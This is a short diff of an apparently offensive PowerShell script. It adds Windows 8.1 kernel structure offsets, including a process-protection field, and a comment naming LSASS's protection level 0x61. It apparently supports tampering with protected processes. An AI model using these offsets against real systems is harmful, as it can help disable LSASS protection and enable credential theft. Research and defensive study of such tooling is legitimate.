@@ -67,7 +67,12 @@ Switch ($mode) {
             $sidHashOffset = "+0x0e8+0x010"
             $activeProcessLinksOffset = "0x2e8"
         }
-    "8.1" {# to do
+    "8.1" {
+            $offset = "348"
+            $sidHashOffset = "+0x0e8+0x010"
+            $activeProcessLinksOffset = "0x2e8"
+            $protectedProcessOffset = "+0x67a" # Protection
+            $protectProcess = "L1 0x61" # LSASS with protection 0x61
         }
     "2r2" {# to do
         }
